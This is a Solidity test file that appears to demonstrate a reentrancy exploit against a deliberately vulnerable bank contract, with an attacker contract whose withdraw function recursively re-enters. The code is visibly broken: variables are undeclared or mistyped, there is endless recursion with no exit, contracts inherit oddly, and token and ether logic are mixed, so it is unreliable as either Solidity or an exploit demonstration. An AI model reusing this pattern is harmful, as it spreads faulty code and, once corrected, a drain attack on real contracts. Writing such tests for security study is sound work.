// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract ReenteringReceiver is BaseTestWithBalanceLog, VulnerableBank {
    address target;
    address attacker;

    function setUp() public override {
        target = new VulnerableBank();
        attacker = address(this);
        fundAccount(attacker, 1 ether);

        IERC20(btc()).approve(address(target), type(uint256).max);
        target.deposit{value: 1 ether}();
    }

    function testExploit() public {
        VM.startPrank(attacker);
        Reenterer receiver = new Reenterer(address(target), attacker);
        receiver.triggerReenter();

        uint256 balanceBeforeWithdrawal = receiver.balances[attacker];
        (bool success,) = bank.call(abi.encodeWithSelector(VulnerableBank.withdraw.selector, uint256(1 ether)));
        require(success, "Withdraw call failed");
        
        uint256 balanceAfterWithdrawal = receiver.balances[attacker];

        assertGt(balanceAfterWithdrawal, balanceBeforeWithdrawal, "Receiver withdrew more than its original deposit");
        VM.stopPrank();
    }
}

contract Reenterer is VulnerableBank {
    address public bank;
    address public attacker;
    uint256 public initialBalance;

    constructor(address _bank, address _attacker) {
        bank = _bank;
        attacker = _attacker;
        IERC20(btc()).approve(_bank, type(uint256).max);
        initialBalance = IERC20(btc()).balanceOf(attacker);
        IERC20(btc()).transferFrom(attacker, bank, 1 ether);

        emit log_named_uint("Initial Balance", initialBalance);
    }

    function triggerReenter() external {
        (bool success,) = bank.call(abi.encodeWithSelector(withdraw.selector, uint256(1 ether)));
        require(success, "Withdraw call failed");
        
        // Re-enter the withdraw function
        IERC20(btc()).approve(address(this), type(uint256).max);
        triggerReenter();
    }

    receive() external payable {}
}